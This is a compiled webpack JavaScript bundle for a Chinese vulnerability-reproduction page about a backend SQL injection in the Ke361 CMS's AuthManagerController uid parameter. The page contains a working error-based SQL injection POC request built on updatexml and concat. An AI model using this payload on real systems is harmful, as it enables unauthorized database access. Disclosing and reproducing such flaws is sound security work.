(window.webpackJsonp=window.webpackJsonp||[]).push([[191],{1108:function(t,a,s){t.exports=s.p+"assets/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232823896.b730640f.png"},1109:function(t,a,s){t.exports=s.p+"assets/img/1634142335709-0384ef5c-e05b-41af-b19d-a5b7864faaf3.2467d6e0.png"},1110:function(t,a,s){t.exports=s.p+"assets/img/1634142341220-a0120691-16d8-41e2-be07-abcaa561347f.c6500d88.png"},2928:function(t,a,s){"use strict";s.r(a);var r=s(64),e=Object(r.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"ke361-authmanagercontroller-class-php-后台sql注入漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ke361-authmanagercontroller-class-php-后台sql注入漏洞"}},[t._v("#")]),t._v(" Ke361 AuthManagerController.class.php 后台SQL注入漏洞")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("Ke361 AuthManagerController.class.php uid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Ke361")]),a("br"),t._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("https://gitee.com/jcove/ke361")]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("CMS产品页面")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1108),alt:"img"}})]),t._v(" "),a("p",[t._v("存在漏洞的文件为 "),a("code",[t._v("Application/Admin/Controller/AuthManagerController.class.php")])]),t._v(" "),a("p",[a("img",{attrs:{src:s(1109),alt:"img"}})]),t._v(" "),a("p",[t._v("验证POC")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("AuthManager"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("group"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("uid"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("'"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("AND"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("updatexml"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("concat")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("md5"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:s(1110),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);